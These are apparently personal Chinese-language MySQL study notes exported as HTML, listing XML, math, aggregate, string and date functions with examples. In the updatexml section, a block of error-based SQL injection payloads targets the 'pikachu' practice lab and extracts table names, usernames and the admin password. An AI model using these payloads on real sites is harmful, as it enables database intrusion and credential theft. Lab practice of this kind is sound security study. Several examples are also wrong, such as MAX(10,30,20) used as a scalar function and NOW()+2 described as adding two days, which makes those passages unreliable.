+  &#x27;/bookstore/book[@id=&quot;1&quot;]/price&#x27;,  -- XPath 定位目标节点
+  &#x27;&lt;price&gt;49.9&lt;/price&gt;&#x27;  -- 新内容
+) AS updated_xml;
+
+------------
+结果：
+&lt;bookstore&gt;
+  &lt;book id=&quot;1&quot;&gt;&lt;title&gt;SQL 基础&lt;/title&gt;&lt;price&gt;49.9&lt;/price&gt;&lt;/book&gt;
+  &lt;book id=&quot;2&quot;&gt;&lt;title&gt;XML 教程&lt;/title&gt;&lt;price&gt;45.0&lt;/price&gt;&lt;/book&gt;
+&lt;/bookstore&gt;</code></pre></div><div style="display:contents" dir="auto"><hr id="35c8db55-6aee-8000-bf4d-c08c20716f4b"/></div><div style="display:contents" dir="auto"><hr id="35c8db55-6aee-80aa-a2c4-e926e22d21b7"/></div><div style="display:contents" dir="auto"><hr id="35c8db55-6aee-80b0-9c90-e3778f8077d9"/></div><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-800c-acfc-ded3f7baa0e6" class="code code-wrap"><code class="language-markdown" style="white-space:pre-wrap;word-break:break-all">k&#x27; and updatexml(1, version(), 0)#
+~ ： 0x7e
+k&#x27; and updatexml(1, concat(0x7e, version()), 0)#
+k&#x27; and updatexml(1, concat(0x7e, database()), 0)#
+# 报错，只会显示一行
+k&#x27; and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27;)), 0)#
+# 使用limit一次一次进行获取表名
+k&#x27; and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1)), 0)#
+# 获取user字段
+k&#x27; and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=&#x27;user&#x27; limit 0,1)), 0)#
+
+# 获取列名后，再来获取其他数据
+k&#x27; and updatexml(1, concat(0x7e, (select username from users limit 0,1)), 0)#
+k&#x27; and updatexml(1, concat(0x7e, (select password from users where username=&#x27;admin&#x27; limit 0,1)), 0)#
+</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-807e-a333-d1942105d7ae" class="toggle"><li><details open=""><summary>extractvalue()</summary><div style="display:contents" dir="auto"><p id="35c8db55-6aee-80bd-a5d3-e3e86042f905" class=""><code>extractvalue()</code> 是 SQL 中用于从 XML 数据中提取指定节点值的函数，广泛应用于支持 XML 类型的数据库。</p></div><div style="display:contents" dir="auto"><p id="35c8db55-6aee-8047-b146-d071bb6b227b" class="">通过 XPath 表达式定位 XML 节点，并并返回，并返回节点的文本内容。</p></div><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-8006-a1b7-c2cbc1229f7d" class="code code-wrap"><code class="language-markdown" style="white-space:pre-wrap;word-break:break-all">extractvalue(xml_target, xpath_expr)
+xml_target：需要解析的 XML 字符串或 XML 类型数据（源 XML）。
+xpath_expr：有效的 XPath 表达式，用于定位要提取的节点。</code></pre></div><div style="display:contents" dir="auto"><hr id="35c8db55-6aee-8004-bcf1-fe46b1918350"/></div><div style="display:contents" dir="auto"><p id="35c8db55-6aee-80c6-b429-d933d8dc0053" class="">例如：</p></div><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-80dd-afd0-c54d684e4876" class="code code-wrap"><code class="language-markdown" style="white-space:pre-wrap;word-break:break-all">&lt;students&gt;
+  &lt;student id=&quot;1&quot;&gt;&lt;name&gt;张三&lt;/name&gt;&lt;age&gt;20&lt;/age&gt;&lt;major&gt;计算机&lt;/major&gt;&lt;/student&gt;
+  &lt;student id=&quot;2&quot;&gt;&lt;name&gt;李四&lt;/name&gt;&lt;age&gt;22&lt;/age&gt;&lt;major&gt;数学&lt;/major&gt;&lt;/student&gt;
+&lt;/students&gt;
+
+---------------
+提取id=‘1’的学生姓名：
+SELECT extractvalue(
+  &#x27;&lt;students&gt;
+    &lt;student id=&quot;1&quot;&gt;&lt;name&gt;张三&lt;/name&gt;&lt;age&gt;20&lt;/age&gt;&lt;/student&gt;
+    &lt;student id=&quot;2&quot;&gt;&lt;name&gt;李四&lt;/name&gt;&lt;age&gt;22&lt;/age&gt;&lt;/student&gt;
+  &lt;/students&gt;&#x27;,
+  &#x27;/students/student[@id=&quot;1&quot;]/name&#x27;  -- XPath 定位 name 节点
+) AS student_name;
+
+---------------------
+student_name
+------------
+张三</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-8006-ba98-cc75184a129c" class="toggle"><li><details open=""><summary>abs()</summary><div style="display:contents" dir="auto"><p id="35c8db55-6aee-80e4-9e24-d568f5847a04" class="">绝对值 </p></div><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-80c9-80b5-f3540f9da4c6" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">SELECT ABS (-10) AS res1, ABS (10) AS res2, ABS (-3.14) AS res3, ABS (0) AS res4;</code></pre></div><div style="display:contents" dir="auto"><p id="35c8db55-6aee-80ba-b3e9-dd71ec450457" class="">
+</p></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-8026-99a8-f17cf5755c7e" class="toggle"><li><details open=""><summary>sign()</summary><div style="display:contents" dir="auto"><p id="35c8db55-6aee-804a-9bd3-c82abc62f82f" class="">符号函数</p></div><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-8045-995f-f8c7a3940883" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">负数 =-1，零 = 0，正数 = 1
+SELECT SIGN (-99) AS res1, SIGN (0) AS res2, SIGN (5) AS res3, SIGN (-0.5) AS res4;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-80c4-bb5a-c93f8fd26a4c" class="toggle"><li><details open=""><summary>round()</summary><div style="display:contents" dir="auto"><p id="35c8db55-6aee-8010-b557-ea230adf347b" class="">四舍五入 (数值，保留小数位数)</p></div><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-80e2-9bfb-c8e70d85f6ca" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">SELECT ROUND (3.1415,2) AS res1,
+ROUND (5.678,1) AS res2,
+ROUND (9.23,0) AS res3,
+ROUND (-2.67,1) AS res4;</code></pre></div><div style="display:contents" dir="auto"><p id="35c8db55-6aee-8090-bb5f-ce1575839c54" class="">
+</p></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-80fe-9381-daa7f64d4611" class="toggle"><li><details open=""><summary>ceil()/ceiling()</summary><div style="display:contents" dir="auto"><p id="35c8db55-6aee-80db-b13a-f2cb7ece82bf" class="">向上取整</p></div><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-8093-b2cf-c66d1eaa9be4" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">SELECT CEIL (3.1) AS res1,
+CEIL (3.9) AS res2,
+CEIL (-2.1) AS res3,
+CEILING (5.0) AS res4;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-800a-b23c-c2096553f70b" class="toggle"><li><details open=""><summary>floor()</summary><div style="display:contents" dir="auto"><p id="35c8db55-6aee-80a6-a3f7-dce18f727d2f" class="">向下取整 </p></div><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-8043-b75e-d0cd66f0568b" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">SELECT FLOOR (3.1) AS res1,
+FLOOR (3.9) AS res2,
+FLOOR (-2.1) AS res3,
+FLOOR (7.999) AS res4;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-8011-8dfe-fc00faa47077" class="toggle"><li><details open=""><summary>truncate()</summary><div style="display:contents" dir="auto"><p id="35c8db55-6aee-8069-87cd-fb191bd90591" class="">截断小数(数值，保留几位) 不四舍五入，直接砍掉</p></div><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-80aa-978f-efd37c35f6c1" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">SELECT TRUNCATE (3.999,1) AS res1,
+TRUNCATE (5.1234,2) AS res2,
+TRUNCATE (8.765,0) AS res3,
+TRUNCATE (-4.56,1) AS res4;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-8047-95b0-cab91021f9d6" class="toggle"><li><details open=""><summary>sqrt()</summary><div style="display:contents" dir="auto"><p id="35c8db55-6aee-808b-be5c-fcf1d655224b" class="">开平方</p></div><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-8046-af1c-d4d2325544e3" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">SELECT SQRT (16) AS res1,
+SQRT (25) AS res2,
+SQRT (2) AS res3,
+SQRT (0) AS res4;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-8058-8ad8-cefafff5683f" class="toggle"><li><details open=""><summary>pow()/power()</summary><div style="display:contents" dir="auto"><p id="35c8db55-6aee-80ac-86cd-cd36a3842434" class="">次方</p></div><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-808e-a9d4-e8bff93bfe76" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">SELECT POW (2,3) AS res1,
+POW (5,2) AS res2,
+POWER (3,4) AS res3,
+POWER (10,-1) AS res4;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-80e5-b833-dbc569879dd3" class="toggle"><li><details open=""><summary>mod()</summary><div style="display:contents" dir="auto"><p id="35c8db55-6aee-8021-8991-e59e160578ec" class="">取余 MOD (a,b) 等价 a % b</p></div><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-806a-8e51-d80d9a8d1c3b" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">SELECT MOD (10,3) AS res1,
+MOD (15,4) AS res2,
+20 % 6 AS res3,
+MOD (-8,3) AS res4;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-80d9-959c-d2f891701a26" class="toggle"><li><details open=""><summary>rand()</summary><div style="display:contents" dir="auto"><p id="35c8db55-6aee-80b3-a40b-f1af77fca328" class="">随机数 RAND () 0~1 小数</p></div><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-8044-819c-d0380b9873b1" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">SELECT RAND () AS res1,
+RAND ()*100 AS res2,
+FLOOR (RAND ()*10) AS res3, -- 0~9 随机整数
+FLOOR (RAND ()*50)+10 AS res4;-- 10~59 随机整数</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-8010-b982-cefd7b3ead67" class="toggle"><li><details open=""><summary>pi()</summary><div style="display:contents" dir="auto"><p id="35c8db55-6aee-804e-b4fe-d084258e148d" class="">圆周率 </p></div><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-806d-8189-c4f828123ce1" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">SELECT PI () AS res1,
+ROUND (PI (),4) AS res2,
+PI ()*2 AS res3;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-80c5-ae3a-f33eca6ac67c" class="toggle"><li><details open=""><summary>log()/log10()</summary><div style="display:contents" dir="auto"><p id="35c8db55-6aee-8038-bd36-edcabe02bbbc" class="">对数</p></div><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-8038-be0e-e8e1a74ac695" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">SELECT LOG (10) AS res1,
+LOG (2.718) AS res2,
+LOG10 (100) AS res3,
+LOG10 (1000) AS res4;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-808a-9538-e64e0b2fc33a" class="toggle"><li><details open=""><summary>max()/min()</summary><div style="display:contents" dir="auto"><p id="35c8db55-6aee-80d2-a8a7-fe708cc6fb4d" class="">最值 MAX () MIN () 单值比较</p></div><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-801d-a0c1-f5339c152b54" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">SELECT MAX (10,30,20) AS res1,
+MAX (5,8,3,12) AS res2,
+MIN (10,30,20) AS res3,
+MIN (5,8,3,12) AS res4;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-807f-9210-fa9c38590669" class="toggle"><li><details open=""><summary>randians()/degrees()</summary><div style="display:contents" dir="auto"><p id="35c8db55-6aee-80cd-be27-cc0f76d93a99" class="">角度弧度转换</p></div><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-80f0-8e5f-c67171472326" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">SELECT RADIANS (180) AS res1,
+RADIANS (90) AS res2,
+DEGREES (PI ()) AS res3,
+DEGREES (PI ()/2) AS res4;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-8067-b512-dfc71d7b4a0a" class="toggle"><li><details open=""><summary>count()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-80db-8289-df0d5dcf4830" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 1. COUNT 统计
+SELECT COUNT(*) AS 总行数;                     -- 统计所有行(包含null)
+SELECT COUNT(score) AS 非空成绩行数;           -- 忽略NULL
+SELECT COUNT(DISTINCT score) AS 去重成绩个数;  -- 去重再统计
+SELECT COUNT(name) AS 姓名总数;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-802b-98db-d119fcb0b69a" class="toggle"><li><details open=""><summary>sum()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-80a4-934f-f51a8a29bbd8" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 2. SUM 求和
+SELECT SUM(score) AS 成绩总和;
+SELECT SUM(score)+100 AS 总和加奖励分;
+SELECT SUM(DISTINCT score) AS 去重成绩求和;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-80d4-b5ae-d0eb235a07f8" class="toggle"><li><details open=""><summary>avg()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-8093-8bbc-efae88a64ea7" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 3. AVG 平均值
+SELECT AVG(score) AS 平均分;
+SELECT ROUND(AVG(score),2) AS 平均分保留2位;
+SELECT AVG(DISTINCT score) AS 去重平均分;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-80bb-a8a2-d2e73544bb82" class="toggle"><li><details open=""><summary>max()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-8089-96c5-d7b1a3d65ba8" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 4. MAX 最大值
+SELECT MAX(score) AS 最高分;
+SELECT MAX(IF(score IS NULL,0,score)) AS 空值按0算最高分;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-80a4-993f-c50c34a27c3a" class="toggle"><li><details open=""><summary>min()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-80c6-9c42-d2353ae8c9e8" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 5. MIN 最小值
+SELECT MIN(score) AS 最低分;
+SELECT MIN(IF(score IS NULL,100,score)) AS 空值按100算最低分;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-80a7-8c98-d49fb673776b" class="toggle"><li><details open=""><summary>concat()/cancat_ws()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-802c-afec-c1866f32d7ba" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 1. 字符串拼接 CONCAT / CONCAT_WS
+SELECT CONCAT(&#x27;Hello&#x27;, &#x27;-&#x27;, &#x27;MySQL&#x27;) AS res1,
+       CONCAT(&#x27;我&#x27;,&#x27;爱&#x27;,&#x27;数据库&#x27;) AS res2,
+       CONCAT(100,&#x27;分&#x27;) AS res3;
+
+SELECT CONCAT_WS(&#x27;,&#x27;, &#x27;张三&#x27;, &#x27;18岁&#x27;, &#x27;男&#x27;) AS res1,
+       CONCAT_WS(&#x27;|&#x27;, &#x27;北京&#x27;, &#x27;朝阳&#x27;, &#x27;某某小区&#x27;) AS res2,
+       CONCAT_WS(&#x27;-&#x27;, &#x27;2026&#x27;,&#x27;05&#x27;,&#x27;10&#x27;) AS res3;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-800a-aaba-d294abc43bdd" class="toggle"><li><details open=""><summary>length()/char_length()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-806a-94cb-edfcae4b598b" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 2. 字符串长度 LENGTH(字节) / CHAR_LENGTH(字符)
+SELECT 
+  LENGTH(&#x27;abc&#x27;) AS len_byte1,
+  LENGTH(&#x27;中文&#x27;) AS len_byte2,
+  LENGTH(&#x27;MySQL数据库&#x27;) AS len_byte3,
+  CHAR_LENGTH(&#x27;abc&#x27;) AS len_char1,
+  CHAR_LENGTH(&#x27;中文&#x27;) AS len_char2,
+  CHAR_LENGTH(&#x27;MySQL数据库&#x27;) AS len_char3;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-805c-8ee5-e9de76775998" class="toggle"><li><details open=""><summary>left()/right()/substring()/substr()/mid()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-801d-85db-c0128a55cb37" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 3. 截取字符串 LEFT / RIGHT / SUBSTRING / SUBSTR / MID
+SELECT LEFT(&#x27;abcdef&#x27;, 3) AS res1,
+       LEFT(&#x27;数据库学习&#x27;, 2) AS res2;
+
+SELECT RIGHT(&#x27;abcdef&#x27;, 2) AS res1,
+       RIGHT(&#x27;数据库学习&#x27;, 2) AS res2;
+SELECT SUBSTR(&#x27;abcdef&#x27;, 2, 2) AS res1,
+       SUBSTR(&#x27;好好学习&#x27;, 3, 2) AS res2;
+
+SELECT MID(&#x27;abcdef&#x27;, 2, 3) AS res1,
+       MID(&#x27;编程开发&#x27;, 1, 2) AS res2;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-80b6-93bf-fe62dd625865" class="toggle"><li><details open=""><summary>trim()/ltrim()/rtrim()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-805d-8c32-d570ef86802b" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 4. 去除空格 TRIM / LTRIM / RTRIM
+SELECT TRIM(&#x27;  hello mysql  &#x27;) AS res1,
+       TRIM(&#x27;  前后空格  &#x27;) AS res2;
+
+SELECT LTRIM(&#x27;  hello&#x27;) AS res1,
+       LTRIM(&#x27;  左空格&#x27;) AS res2;
+
+SELECT RTRIM(&#x27;mysql  &#x27;) AS res1,
+       RTRIM(&#x27;右空格  &#x27;) AS res2;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-809a-ac80-e6be89857502" class="toggle"><li><details open=""><summary>upper()/lower()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-80e5-810d-c769abd7fa06" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 5. 大小写转换 UPPER / LOWER
+SELECT UPPER(&#x27;mysql hello&#x27;) AS res1,
+       UPPER(&#x27;abc123&#x27;) AS res2;
+
+SELECT LOWER(&#x27;MYSQL HELLO&#x27;) AS res1,
+       LOWER(&#x27;ABCDEF&#x27;) AS res2;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-80ea-9784-da29203b5379" class="toggle"><li><details open=""><summary>replace()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-8098-965c-c54e5096f628" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 6. 字符串替换 REPLACE
+SELECT REPLACE(&#x27;abc123abc&#x27;, &#x27;abc&#x27;, &#x27;xyz&#x27;) AS res1,
+       REPLACE(&#x27;2026-05-10&#x27;, &#x27;-&#x27;, &#x27;/&#x27;) AS res2,
+       REPLACE(&#x27;你好世界&#x27;, &#x27;世界&#x27;, &#x27;MySQL&#x27;) AS res3;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-80b9-9fde-c901f18a27df" class="toggle"><li><details open=""><summary>locate()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-809d-8490-fd8744aac0fe" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 7. 查找子串位置 LOCATE
+SELECT LOCATE(&#x27;b&#x27;, &#x27;abcdef&#x27;) AS res1,
+       LOCATE(&#x27;cd&#x27;, &#x27;abcdef&#x27;) AS res2,
+       LOCATE(&#x27;MySQL&#x27;, &#x27;Hello MySQL&#x27;) AS res3,
+       LOCATE(&#x27;java&#x27;, &#x27;abcdef&#x27;) AS res4; -- 找不到返回0</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-8094-8fe6-d06c86335804" class="toggle"><li><details open=""><summary>repeat()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-8045-8e26-c50fa9edcdb1" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 8. 字符串重复 REPEAT
+SELECT REPEAT(&#x27;A&#x27;, 5) AS res1,
+       REPEAT(&#x27;好&#x27;, 3) AS res2,
+       REPEAT(&#x27;*-&#x27;, 4) AS res3;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-802f-9e72-d1d1f844bb27" class="toggle"><li><details open=""><summary>reverse()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-805a-b37c-f1c02d6a7300" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 9. 字符串反转 REVERSE
+SELECT REVERSE(&#x27;12345abc&#x27;) AS res1,
+       REVERSE(&#x27;abcdef&#x27;) AS res2,
+       REVERSE(&#x27;我爱编程&#x27;) AS res3;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-80a4-917a-ecbf1572ad4b" class="toggle"><li><details open=""><summary>lpad()/rpad()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-80a5-b02e-f36a0fcda0ae" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 10. 左右填充补齐 LPAD / RPAD
+SELECT LPAD(&#x27;66&#x27;, 5, &#x27;0&#x27;) AS res1,   -- 左补0到5位
+       LPAD(&#x27;88&#x27;, 6, &#x27;#&#x27;) AS res2;
+
+SELECT RPAD(&#x27;66&#x27;, 5, &#x27;*&#x27;) AS res1,   -- 右补*到5位
+       RPAD(&#x27;张三&#x27;, 6, &#x27; &#x27;) AS res2;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-8069-8de1-f01084d5025f" class="toggle"><li><details open=""><summary>strcmp()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-8087-95f7-ceb8766123da" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 11. 字符串比较 STRCMP
+SELECT STRCMP(&#x27;abc&#x27;, &#x27;abc&#x27;) AS res1,  -- 相等 0
+       STRCMP(&#x27;a&#x27;, &#x27;b&#x27;) AS res2,     -- 前小后大 -1
+       STRCMP(&#x27;b&#x27;, &#x27;a&#x27;) AS res3,     -- 前大后小 1
+       STRCMP(&#x27;123&#x27;, &#x27;45&#x27;) AS res4;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-8046-a834-d4454ef0cc76" class="toggle"><li><details open=""><summary>ascii()/char()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-80ad-bf4b-dc6af4426c03" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 12. ASCII 与 字符互转 ASCII / CHAR
+SELECT ASCII(&#x27;A&#x27;) AS res1,
+       ASCII(&#x27;a&#x27;) AS res2,
+       ASCII(&#x27;0&#x27;) AS res3;
+
+SELECT CHAR(65) AS res1,
+       CHAR(97) AS res2,
+       CHAR(48) AS res3;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-80b6-9fbe-c1dfa8eae566" class="toggle"><li><details open=""><summary>curdate()/not()/sysdate()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-80bc-aaa5-fafdd139d9a2" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 1. 获取当前日期、时间
+SELECT CURDATE() AS 当前日期, CURDATE() + 1 AS 明天;
+SELECT CURTIME() AS 当前时间, CURTIME() + 1 AS 加1秒;
+SELECT NOW() AS 当前日期时间, NOW() + 2 AS 加2天;
+SELECT SYSDATE() AS 系统当前时间, SYSDATE() - 1 AS 减1天;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-80d9-8f18-dcbd62320b61" class="toggle"><li><details open=""><summary>year()/month()/day()/hour()/minute()/second()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-805f-ba61-cadf0d9b95c5" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 2. 提取年、月、日、时、分、秒
+SELECT YEAR(NOW()) AS 年, YEAR(&#x27;2025-10-01&#x27;) AS 指定年;
+SELECT MONTH(NOW()) AS 月, MONTH(&#x27;2025-12-05&#x27;) AS 指定月;
+SELECT DAY(NOW()) AS 日, DAY(&#x27;2025-05-20&#x27;) AS 指定日;
+SELECT HOUR(NOW()) AS 时, HOUR(&#x27;2025-05-10 15:30:00&#x27;) AS 指定时;
+SELECT MINUTE(NOW()) AS 分, MINUTE(&#x27;2025-05-10 15:30:00&#x27;) AS 指定分;
+SELECT SECOND(NOW()) AS 秒, SECOND(&#x27;2025-05-10 15:30:45&#x27;) AS 指定秒;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-80e2-8d53-ffce6463e9d6" class="toggle"><li><details open=""><summary>dayofweek()/weekday()/dayofmonth()/dayofyear()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-8062-b91a-f0ccc739e569" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 3. 星期相关
+SELECT DAYOFWEEK(NOW()) AS 星期1, DAYOFWEEK(&#x27;2025-05-01&#x27;) AS 星期2;
+SELECT WEEKDAY(NOW()) AS 星期序号1, WEEKDAY(&#x27;2025-05-01&#x27;) AS 星期序号2;
+SELECT DAYOFMONTH(NOW()) AS 当月第几天1, DAYOFMONTH(&#x27;2025-05-15&#x27;) AS 当月第几天2;
+SELECT DAYOFYEAR(NOW()) AS 当年第几天1, DAYOFYEAR(&#x27;2025-12-31&#x27;) AS 当年第几天2;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-80cf-a2fb-d912c9df8ce4" class="toggle"><li><details open=""><summary>date_add()/date_sub()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-803e-993c-f198b252736d" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 4. 日期加减
+SELECT DATE_ADD(NOW(), INTERVAL 1 DAY) AS 1天后, DATE_ADD(NOW(), INTERVAL 10 DAY) AS 10天后;
+SELECT DATE_SUB(NOW(), INTERVAL 1 DAY) AS 1天前, DATE_SUB(NOW(), INTERVAL 7 DAY) AS 7天前;
+SELECT DATE_ADD(CURDATE(), INTERVAL 1 MONTH) AS 1月后, DATE_ADD(CURDATE(), INTERVAL 3 MONTH) AS 3月后;
+SELECT DATE_ADD(CURDATE(), INTERVAL 1 YEAR) AS 1年后, DATE_ADD(CURDATE(), INTERVAL 2 YEAR) AS 2年后;
+SELECT DATE_ADD(NOW(), INTERVAL 1 HOUR) AS 1小时后, DATE_ADD(NOW(), INTERVAL 30 MINUTE) AS 30分钟后;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-80d5-b584-ff4080518058" class="toggle"><li><details open=""><summary>datediff()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-805d-8459-d3c4124299e1" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 5. 日期相差天数
+SELECT DATEDIFF(&#x27;2026-05-10&#x27;,&#x27;2026-05-01&#x27;) AS 相差1,
+       DATEDIFF(&#x27;2026-06-01&#x27;,&#x27;2026-05-10&#x27;) AS 相差2,
+       DATEDIFF(CURDATE(),&#x27;2025-01-01&#x27;) AS 与今天相差;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-8094-b01a-d497996419ab" class="toggle"><li><details open=""><summary>timestampdiff()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-80aa-927a-f68a7889946e" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 6. 时间差
+SELECT TIMESTAMPDIFF(SECOND,&#x27;2026-05-10 10:00:00&#x27;,&#x27;2026-05-10 10:05:00&#x27;) AS 秒数;
+SELECT TIMESTAMPDIFF(MINUTE,&#x27;2026-05-10 10:00:00&#x27;,&#x27;2026-05-10 10:30:00&#x27;) AS 分钟;
